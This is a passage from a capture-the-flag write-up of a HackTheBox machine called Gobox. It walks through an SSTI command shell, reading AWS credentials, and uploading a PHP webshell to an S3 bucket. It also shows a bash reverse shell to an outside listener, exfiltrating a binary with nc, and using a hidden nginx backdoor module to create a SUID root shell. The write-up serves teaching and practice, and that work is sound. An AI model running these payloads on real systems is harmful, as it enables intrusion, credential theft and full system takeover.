+            <span class="n">result</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">capture_re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">).</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>    
+            <span class="n">result</span> <span class="o">=</span> <span class="nf">unescape</span><span class="p">(</span><span class="nf">unescape</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="kn">import</span> <span class="n">pdb</span><span class="p">;</span> <span class="n">pdb</span><span class="p">.</span><span class="nf">set_trace</span><span class="p">()</span>
+
+
+    <span class="k">def</span> <span class="nf">do_exit</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">Exit</span><span class="sh">"""</span>
+        <span class="k">return</span> <span class="bp">True</span>
+
+
+<span class="n">term</span> <span class="o">=</span> <span class="nc">Term</span><span class="p">()</span>
+<span class="n">term</span><span class="p">.</span><span class="nf">cmdloop</span><span class="p">()</span>
+</code></pre></div></div>
+<p>When I give it anything besides <code class="language-plaintext highlighter-rouge">exit</code>, it will make the request to run the command and use a regex to pull the SSTI result from the returned page.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>python3 shell.py 
+<span class="gp">gobox&gt;</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span><span class="gp">gobox&gt;</span><span class="w"> </span><span class="nb">pwd</span>
+<span class="go">/opt/uhc
+</span></code></pre></div></div>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="filesystem">Filesystem</h4>
+<p>The hostname of this system is aws:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gobox&gt;</span><span class="w"> </span><span class="nb">hostname</span>
+<span class="go">aws
+</span></code></pre></div></div>
+<p>When <code class="language-plaintext highlighter-rouge">ifconfig</code> and <code class="language-plaintext highlighter-rouge">ip</code> are not installed on the system, it’s a really good hint that this is a container.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gobox&gt;</span><span class="w"> </span>ifconfig
+<span class="go">/bin/bash: ifconfig: command not found
+</span><span class="gp">gobox&gt;</span><span class="w"> </span>ip
+<span class="go">/bin/bash: ip: command not found
+</span></code></pre></div></div>
+<p>I can grab the IP from <code class="language-plaintext highlighter-rouge">/proc/net/fib_trie</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gobox&gt;</span><span class="w"> </span><span class="nb">cat</span> /proc/net/fib_trie 
+<span class="go">...[snip]...
+           |-- 172.28.0.2
+...[snip]...
+</span></code></pre></div></div>
+<p>There is a <code class="language-plaintext highlighter-rouge">.dockerenv</code> file in the root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gobox&gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /
+<span class="go">total 60
+drwxr-xr-x   1 root root 4096 Aug 24 19:06 .
+drwxr-xr-x   1 root root 4096 Aug 24 19:06 ..
+-rwxr-xr-x   1 root root    0 Aug 24 19:06 .dockerenv
+lrwxrwxrwx   1 root root    7 Jul 23 17:35 bin -&gt; usr/bin
+drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
+drwxr-xr-x   5 root root  340 Aug 26 16:14 dev
+drwxr-xr-x   1 root root 4096 Aug 24 19:06 etc
+drwxr-xr-x   2 root root 4096 Apr 15  2020 home
+lrwxrwxrwx   1 root root    7 Jul 23 17:35 lib -&gt; usr/lib
+lrwxrwxrwx   1 root root    9 Jul 23 17:35 lib32 -&gt; usr/lib32
+lrwxrwxrwx   1 root root    9 Jul 23 17:35 lib64 -&gt; usr/lib64
+lrwxrwxrwx   1 root root   10 Jul 23 17:35 libx32 -&gt; usr/libx32
+drwxr-xr-x   2 root root 4096 Jul 23 17:35 media
+drwxr-xr-x   2 root root 4096 Jul 23 17:35 mnt
+drwxr-xr-x   1 root root 4096 Aug 24 19:06 opt
+dr-xr-xr-x 271 root root    0 Aug 26 16:14 proc
+drwx------   1 root root 4096 Aug 26 15:18 root
+drwxr-xr-x   5 root root 4096 Jul 23 17:38 run
+lrwxrwxrwx   1 root root    8 Jul 23 17:35 sbin -&gt; usr/sbin
+drwxr-xr-x   2 root root 4096 Jul 23 17:35 srv
+dr-xr-xr-x  13 root root    0 Aug 26 16:14 sys
+drwxrwxrwt   1 root root 4096 Aug 24 19:09 tmp
+drwxr-xr-x   1 root root 4096 Jul 23 17:35 usr
+drwxr-xr-x   1 root root 4096 Jul 23 17:38 var
+</span></code></pre></div></div>
+<h4 id="aws">AWS</h4>
+<p>The hostname is a hint that this might be or at least represent an AWS EC2 container / host. The AWS command line tool, <code class="language-plaintext highlighter-rouge">aws</code> is installed as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gobox&gt;</span><span class="w"> </span>which aws
+<span class="go">/usr/bin/aws
+</span></code></pre></div></div>
+<p>Looking at S3, the <code class="language-plaintext highlighter-rouge">ls</code> command shows a single bucket named <code class="language-plaintext highlighter-rouge">website</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gobox&gt;</span><span class="w"> </span>aws s3 <span class="nb">ls</span>
+<span class="go">2021-08-26 16:14:44 website
+</span></code></pre></div></div>
+<p>That bucket seems to contain files associated with the site on port 80:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gobox&gt;</span><span class="w"> </span>aws s3 <span class="nb">ls </span>s3://website
+<span class="go">                           PRE css/
+2021-08-26 16:14:44    1294778 bottom.png
+2021-08-26 16:14:44     165551 header.png
+2021-08-26 16:14:44          5 index.html
+2021-08-26 16:14:44       1803 index.php
+</span></code></pre></div></div>
+<p>Even <code class="language-plaintext highlighter-rouge">index.html</code> is there. Remembering that I’m running this from the container, I can copy a file from the bucket to somewhere on that filesystem, like <code class="language-plaintext highlighter-rouge">/tmp</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gobox&gt;</span><span class="w"> </span>aws s3 <span class="nb">cp </span>s3://website/index.html /tmp/index.html
+<span class="go">download: s3://website/index.html to ../../tmp/index.htmlmaining
+</span><span class="gp">gobox&gt;</span><span class="w"> </span><span class="nb">cat</span> /tmp/index.html
+<span class="go">test
+</span></code></pre></div></div>
+<p>The contents are the same.</p>
+<h4 id="aws-credentials">AWS Credentials</h4>
+<p>If I wanted to interact with the AWS stack from my host, that’s what TCP 4566 is. I can grab the credentials file from <code class="language-plaintext highlighter-rouge">~/.aws</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gobox&gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> ~/.aws
+<span class="go">total 12
+drwxr-xr-x 2 root root 4096 Aug 24 19:06 .
+drwx------ 1 root root 4096 Aug 26 15:18 ..
+-rw-r--r-- 1 root root  260 Aug 24 16:21 credentials
+</span><span class="gp">gobox&gt;</span><span class="w"> </span><span class="nb">cat</span> ~/.aws/credentials
+<span class="go">[default]
+aws_access_key_id=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
+aws_secret_access_key=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
+</span></code></pre></div></div>
+<p>If I put that in my local <code class="language-plaintext highlighter-rouge">~/.aws/credentials</code>, now I can hit this LocalStack from my VM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>aws <span class="nt">--endpoint-url</span> http://10.10.11.113:4566 s3 <span class="nb">ls</span>
+<span class="go">2021-08-26 12:14:44 website
+</span></code></pre></div></div>
+<h3 id="webshell">Webshell</h3>
+<p>With this access to the bucket containing the files from the site running with PHP, I’ll try to write a simple PHP webshell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gobox&gt;</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'&lt;?php echo shell_exec($_REQUEST["cmd"]); ?&gt;'</span>
+<span class="go">&lt;?php echo shell_exec($_REQUEST["cmd"]); ?&gt;
+</span><span class="gp">gobox&gt;</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'&lt;?php echo shell_exec($_REQUEST["cmd"]); ?&gt;'</span> <span class="o">&gt;</span> /tmp/.0xdf
+</code></pre></div></div>
+<p>Now I’ll upload that file to the bucket:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gobox&gt;</span><span class="w"> </span>aws s3 <span class="nb">cp</span> /tmp/.0xdf s3://website/0xdf.php
+<span class="go">upload: ../../tmp/.0xdf to s3://website/0xdf.phpile(s) remaining
+</span></code></pre></div></div>
+<p>It’s not weird that a website might be <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/HostingWebsiteOnS3Setup.html">hosted out of an S3 bucket</a>.  It’s a bit odd that that site would be running PHP, but not impossible.</p>
+<p>Either the site is hosted from the bucket or there’s some process keeping the bucket and the site in sync, so the webshell shows up instantly on the main site:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826141101951.webp" type="image/webp"/>
+<img alt="image-20210826141101951" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826141101951.png"/>
+</picture>
+<h3 id="shell">Shell</h3>
+<p>This time the host can connect back. I’ll visit:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.11.113/0xdf.php?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.6/443 0&gt;%261'
+</code></pre></div></div>
+<p>And at a listening <code class="language-plaintext highlighter-rouge">nc</code>, there’s a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.11.113] 48048
+bash: cannot set terminal process group (819): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@gobox:/opt/website$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll upgrade the shell with the <code class="language-plaintext highlighter-rouge">script</code> trick:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:/opt/website$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, file is /dev/null
+</span><span class="gp">www-data@gobox:/opt/website$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@gobox:/opt/website$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:/home/ubuntu$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">d6b91626************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="filesystem-1">Filesystem</h4>
+<p>There’s nothing else in the ubuntu user’s home directory, so I’ll turn the the web servers. Interestingly, there’s nothing in <code class="language-plaintext highlighter-rouge">/var/www/html</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:~/html$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 12
+drwxr-xr-x 2 root root 4096 Aug 23 14:43 .
+drwxr-xr-x 3 root root 4096 Aug 23 14:43 ..
+-rw-r--r-- 1 root root  612 Aug 23 14:43 index.nginx-debian.html
+</span></code></pre></div></div>
+<p>And that’s the only folder in <code class="language-plaintext highlighter-rouge">/var/www</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:~$</span><span class="w"> </span><span class="nb">ls</span> 
+<span class="go">html
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled</code> has the config for the various hosts:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:/etc/nginx/sites-enabled$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">default
+</span></code></pre></div></div>
+<p>The config defines four servers.</p>
+<h4 id="localstack-server">LocalStack Server</h4>
+<p>The first is 4566:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server {            
+        listen 4566 default_server;              
+                               
+                               
+        root /var/www/html;
+                               
+        index index.html index.htm index.nginx-debian.html;
+                               
+        server_name _;     
+                               
+                               
+        location / {                                          
+                if ($http_authorization !~ "(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZ
+UJveCAtIEhhY2tpbmdFc3BvcnRz(.*)") {
+                    return 403; 
+                }
+                proxy_pass http://127.0.0.1:9000;
+        }
+
+}
+</code></pre></div></div>
+<p>It’s doing a hardcoded auth check. If that fails, it will return 403, which matches the enumeration above. If that succeeds, it forwards to port 9000.</p>
+<p>In the process list, there’s a <code class="language-plaintext highlighter-rouge">docker-proxy</code> running, listening on 9000, forwarding to 4566 in a container at 172.28.0.3:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:/etc/nginx/sites-enabled$</span><span class="w"> </span>ps auxww
+<span class="go">...[snip]...
+root        1104  0.0  0.0 1222832 3764 ?        Sl   16:14   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 9000 -container-ip 172.28.0.3 -container-port 4566
+...[snip]...
+</span></code></pre></div></div>
+<p>That’s a different container than the Go webserver, and would likely be the LocalStack container. These hardcoded creds are a bit of a kludge, but LocalStack doesn’t have the capability to authenticate, as it’s just a test platform. This is a neat way to give localstack a more real-world feel with creds.</p>
+<h4 id="main-server">Main Server</h4>
+<p>The next server is listening on 80:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server {
+        listen 80;
+        root /opt/website;
+        index index.php;
+
+        location ~ [^/]\.php(/|$) {
+            fastcgi_index index.php;
+            fastcgi_param REQUEST_METHOD $request_method;
+            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+            fastcgi_param QUERY_STRING $query_string;
+
+
+            fastcgi_pass unix:/tmp/php-fpm.sock;
+        }
+}
+</code></pre></div></div>
+<p>It is based out of <code class="language-plaintext highlighter-rouge">/opt/website</code> and it’s forwarding PHP on to a socket to handle that. Nothing too exciting here.</p>
+<h4 id="golang-server">Golang Server</h4>
+<p>The third server is listening on 8080:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server {
+        listen 8080;
+        add_header X-Forwarded-Server golang;
+        location / {
+                proxy_pass http://127.0.0.1:9001;
+        }
+}
+</code></pre></div></div>
+<p>This is where the custom header is added, and otherwise it’s just proxied on to localhost 9001.</p>
+<p><code class="language-plaintext highlighter-rouge">docker-proxy</code> is also handing that forward to the Golang container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:/etc/nginx/sites-enabled$</span><span class="w"> </span>ps auxww
+<span class="go">...[snip]...
+root        1084  0.1  0.1 1741004 5084 ?        Sl   16:14   0:14 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 9001 -container-ip 172.28.0.2 -container-port 80
+...[snip]...
+</span></code></pre></div></div>
+<h4 id="unknown-server">Unknown Server</h4>
+<p>There’s an unknown server listening only on localhost, TCP 8000:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server {
+        listen 127.0.0.1:8000;
+        location / {
+                command on;
+        }
+}
+</code></pre></div></div>
+<p>It doesn’t have a home directory, and it’s only directive is <code class="language-plaintext highlighter-rouge">command on</code>, which doesn’t mean anything to me.</p>
+<p>I tried googling for it, but came up empty. It’s definitely not a standard NGINX thing. So I looked in the modules:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:/etc/nginx/modules-enabled$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">50-backdoor.conf               50-mod-http-xslt-filter.conf  50-mod-stream.conf
+50-mod-http-image-filter.conf  50-mod-mail.conf
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">50-backdoor.conf</code> is pretty suspicious!</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:/etc/nginx/modules-enabled$</span><span class="w"> </span><span class="nb">cat </span>50-backdoor.conf 
+<span class="go">load_module modules/ngx_http_execute_module.so;
+</span></code></pre></div></div>
+<p>Googling for “ngx_http_execute_module.so”, the first result is <a href="https://github.com/limithit/NginxExecute">this GitHub</a>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826151346829.webp" type="image/webp"/>
+<img alt="image-20210826151346829" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826151346829.png"/>
+</picture>
+<p>That definitely looks like what what’s on Gobox.</p>
+<h3 id="backdoor-fail">Backdoor Fail</h3>
+<p>According to the docs, I should be able to trigger this backdoor by making a request to the server with this enabled with the parameter <code class="language-plaintext highlighter-rouge">?system.run[command]</code>.</p>
+<p>Since the server is only listening on localhost, I’ll just use <code class="language-plaintext highlighter-rouge">curl</code> from my shell. It doesn’t work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:~$</span><span class="w"> </span>curl http://127.0.0.1:8000?system.run[id]
+<span class="go">curl: (52) Empty reply from server
+</span></code></pre></div></div>
+<h3 id="identify-argument">Identify Argument</h3>
+<h4 id="exfil-copy">Exfil Copy</h4>
+<p>To take a look at the backdoor, I needed to find a copy. I knew from the config that it’s named <code class="language-plaintext highlighter-rouge">ngx_http_execute_module.so</code>, so I just used <code class="language-plaintext highlighter-rouge">find</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:~$</span><span class="w"> </span>find / <span class="nt">-name</span> ngx_http_execute_module.so 2&gt;/dev/null
+<span class="go">/usr/lib/nginx/modules/ngx_http_execute_module.so
+</span><span class="gp">www-data@gobox:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/lib/nginx/modules/ngx_http_execute_module.so 
+<span class="go">-rw-r--r-- 1 root root 163896 Aug 23 20:59 /usr/lib/nginx/modules/ngx_http_execute_module.so
+</span></code></pre></div></div>
+<p>I’m able to read it as well. I’ll send it back to a listening <code class="language-plaintext highlighter-rouge">nc</code> on my host with:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:~$</span><span class="w"> </span><span class="nb">cat</span> /usr/lib/nginx/modules/ngx_http_execute_module.so | nc 10.10.14.6 443
+</code></pre></div></div>
+<p>At my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443 <span class="o">&gt;</span> ngx_http_execute_module.so
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.11.113] 48084
+^C
+</span></code></pre></div></div>
+<p>And the hashes match:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:~$</span><span class="w"> </span><span class="nb">md5sum</span> /usr/lib/nginx/modules/ngx_http_execute_module.so
+<span class="go">15f0ad443a4b4888bfbee4e5b2cf0ae6  /usr/lib/nginx/modules/ngx_http_execute_module.so
+</span></code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">md5sum </span>ngx_http_execute_module.so 
+<span class="go">15f0ad443a4b4888bfbee4e5b2cf0ae6  ngx_http_execute_module.so
+</span></code></pre></div></div>
+<h4 id="strings">Strings</h4>
+<p>Just running strings on the binary is enough to figure out the new command word:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>strings ngx_http_execute_module.so
+<span class="go">...[snip]...
+ippsec.run
+...[snip]...
+</span></code></pre></div></div>
+<p>That looks too similar to <code class="language-plaintext highlighter-rouge">system.run</code> to not be it.</p>
+<h3 id="execute-via-backdoor">Execute via Backdoor</h3>
+<p>Trying again with the new argument name works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:~$</span><span class="w"> </span>curl http://127.0.0.1:8000?ippsec.run[id]
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>Typically to save myself having to url-encode, I would switch to a GET (<code class="language-plaintext highlighter-rouge">-G</code>) with <code class="language-plaintext highlighter-rouge">--data-urlencode</code>, but the issue here is that I don’t want to encode the <code class="language-plaintext highlighter-rouge">[]</code>.</p>
+<p>Still, I can do it myself:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:~$</span><span class="w"> </span>curl <span class="s1">'http://127.0.0.1:8000?ippsec.run[ls%20%2froot]'</span>
+<span class="go">iptables.sh
+snap
+</span></code></pre></div></div>
+<p>To get shell, I’ll copy Bash into <code class="language-plaintext highlighter-rouge">tmp</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:~$</span><span class="w"> </span>curl <span class="s1">'http://127.0.0.1:8000?ippsec.run[cp%20%2fbin%2fbash%20%2ftmp]'</span>
+<span class="go">curl: (52) Empty reply from server
+</span><span class="gp">www-data@gobox:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/bash
+<span class="go">-rwxr-xr-x 1 root root 1183448 Aug 26 19:38 /tmp/bash
+</span></code></pre></div></div>
+<p>Now <code class="language-plaintext highlighter-rouge">chmod</code> to set it as SUID:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:~$</span><span class="w"> </span>curl <span class="s1">'http://127.0.0.1:8000?ippsec.run[chmod%204777%20%2ftmp%2fbash]'</span>      
+<span class="go">curl: (52) Empty reply from server
+</span><span class="gp">www-data@gobox:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/bash
+<span class="go">-rwsrwxrwx 1 root root 1183448 Aug 26 19:38 /tmp/bash
+</span></code></pre></div></div>
+<p>Notice the <code class="language-plaintext highlighter-rouge">s</code> as the forth letter there. Running it with <code class="language-plaintext highlighter-rouge">-p</code> will preserve privilege:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@gobox:~$</span><span class="w"> </span>/tmp/bash <span class="nt">-p</span>
+<span class="go">bash-5.0#
+</span></code></pre></div></div>
+<p>And I can get the last flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+<span class="go">81d35170************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2021/08/30/htb-gobox.html"></a>
+</article>
